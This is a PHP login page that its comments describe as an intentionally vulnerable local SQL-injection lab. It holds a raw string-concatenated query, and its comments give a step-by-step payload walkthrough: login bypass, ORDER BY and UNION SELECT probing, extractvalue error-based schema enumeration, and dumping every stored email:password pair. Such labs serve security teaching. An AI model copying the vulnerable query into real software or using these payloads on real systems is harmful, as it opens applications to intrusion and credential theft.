<?php
// SQL Injection Vulnerable Login Page
// Keep query failures on the page so ORDER BY/error-based exercises match the notes.
mysqli_report(MYSQLI_REPORT_OFF);
include "database.php";

if (isset($_POST['login'])) {
    // Intentionally vulnerable: this page belongs to the local SQL-injection lab.
    // Never copy this query pattern into an application that handles real data.
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Raw input concatenation is the injection point demonstrated by this page.
    $query = "SELECT * FROM users WHERE email='$email' AND password='$password'";
    $result = mysqli_query($database, $query);
    if (!$result) {
        echo "SQL ERROR: " . htmlspecialchars(mysqli_error($database), ENT_QUOTES, 'UTF-8');
    } elseif (mysqli_num_rows($result) > 0) {
        echo "Login successful! (" . mysqli_num_rows($result) . " row(s))";
        echo "<pre class='results'>";
        while ($row = mysqli_fetch_assoc($result)) {
            echo htmlspecialchars(print_r($row, true), ENT_QUOTES, 'UTF-8');
        }
        echo "</pre>";
    } else {
        echo "Invalid email or password. (0 rows)";
    }
    // For debugging purposes, show the raw query (never do this in production)
    echo "<div class='debug'>DEBUG — Query executed: <code>" . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</code></div>";
    // Login bypass example:
    // Email: ' OR '1'='1
    // Password: ' OR '1'='1

    //     Payload	Expected output
    // ' ORDER BY 1 -- 	Invalid email or password. (0 rows) ← query worked
    // ' ORDER BY 2 -- 	Invalid email or password. (0 rows)
    // ' ORDER BY 3 -- 	maybe still 0 rows
    // ' ORDER BY 99 -- 	SQL ERROR: Unknown column '99' in 'order clause' ← too high

    // Then move on to UNION
    // This users table has 9 columns, so UNION must return exactly 9 values:
    // ' UNION SELECT 1,2,3,4,5,6,7,8,9 #

    // This time you should see "Login successful! (1 row(s))" because UNION SELECT produced a synthetic row. Then swap the numbers for real data:

    // Important note about the trailing space
    // --  in MySQL requires a space (or newline/tab) after the two dashes. If your input box trims trailing whitespace, use # instead:

    // Try ' ORDER BY 99 --  now and you should finally see a real SQL error message confirming the injection point.

    // ' UNION SELECT 1,2,3,4,5,6,7,8,9 # shows a synthetic row and confirms the column count.

    //' UNION SELECT database(),version(),user(),@@hostname,5,6,7,8,9 # shows environment values in the first four result fields.
    //' AND extractvalue(1,concat(0x7e,(SELECT database()))) -- should show you the database name in an XML error message, confirming the injection point and allowing you to extract data using subqueries in the same way.
    //' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- should show you a list of all tables in the current database, allowing you to identify the target table (e.g., users) for further data extraction.
    //' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema=database()))) -- should show you a list of all columns in the users table, allowing you to identify the target columns (e.g., email, password) for final data extraction.
    //' UNION SELECT GROUP_CONCAT(email,0x3a,password SEPARATOR 0x0a),2,3,4,5,6,7,8,9 FROM users #
    // should show you a list of all email:password pairs from the users table, allowing you to compromise user accounts.
    //' UNION SELECT id,first_name,last_name,email,password,role,profile_picture,created_at,updated_at FROM users #
}
// Write a code that is secure against SQL injection by using prepared statements and parameterized queries.
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form action="login.php" method="POST">
        <h3>Login</h3>
        <input name="email" type="text"> <br><br>
        <input name="password" type="password"> <br><br>
        <button name="login">Login</button>
    </form>
</body>

</html>
